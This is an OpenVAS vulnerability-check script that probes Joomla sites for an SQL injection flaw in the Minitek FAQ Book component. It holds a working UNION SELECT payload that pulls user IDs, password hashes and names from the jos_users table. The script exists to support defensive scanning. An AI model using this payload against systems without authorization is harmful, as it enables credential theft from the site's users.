##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_minitek_sql_inj_vuln.nasl 7573 2017-10-26 09:18:50Z cfischer $
#
# Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let attackers to manipulate SQL
queries by injecting arbitrary SQL code.

Impact Level: Application.";

tag_affected = "Joomla Minitek FAQ Book component version 1.3";

tag_insight = "The flaw is due to input passed via the 'id' parameter to
'index.php' (when 'option' is set to 'com_faqbook' and 'view' is set to
'category') is not properly sanitised before being used in a SQL query.";

tag_solution = "Upgrade to Joomla Minitek FAQ Book component version 1.4 or
later. For updates refer to http://www.minitek.gr/";

tag_summary = "This host is running Joomla Minitek FAQ Book component and is
prone to SQL injection vulnerability.";

if(description)
{
  script_id(802106);
  script_version("$Revision: 7573 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 11:18:50 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-06-20 15:22:27 +0200 (Mon, 20 Jun 2011)");
  script_bugtraq_id(48223);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44943");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102195/joomlafaqbook-sql.txt");
  script_xref(name : "URL" , value : "http://www.exploit-id.com/web-applications/joomla-component-minitek-faq-book-sql-injection");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

joomlaPort = get_http_port(default:80);

if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

host = http_host_name( port:joomlaPort );

if( joomlaDir == "/" ) joomlaDir = "";

sndReq = http_get(item:string(joomlaDir, "/index.php"), port:joomlaPort);
rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);

## Extract the Cookie from the response to construct request
cookie = eregmatch(pattern:"Set-Cookie: ([a-zA-Z0-9=]+).*", string:rcvRes);

## Set the Cookie, If it does not come in the Response
if(!cookie[1]){
  cookie = "bce47a007c8b2cf96f79c7a0d154a9be=399e73298f66054c1a66858050b785bf";
} else {
  cookie = cookie[1];
}

## Construct the Crafted request
sndReq = string("GET ", joomlaDir, "/index.php?option=com_faqbook&view=category" +
                "&id=-7+union+select+1,2,3,4,5,6,7,8,concat_ws(0x3a,0x4f70656e564153," +
                "id,password,0x4f70656e564153,name),10,11,12,13,14,15,16,17,18,19," +
                "20,21,22,23,24,25,26+from+jos_users--", " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Cookie: ", cookie , "; path=/", "\r\n\r\n");

rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);

if(egrep(string:rcvRes, pattern:"OpenVAS:[0-9]+:(.+):OpenVAS")){
  security_message(joomlaPort);
}
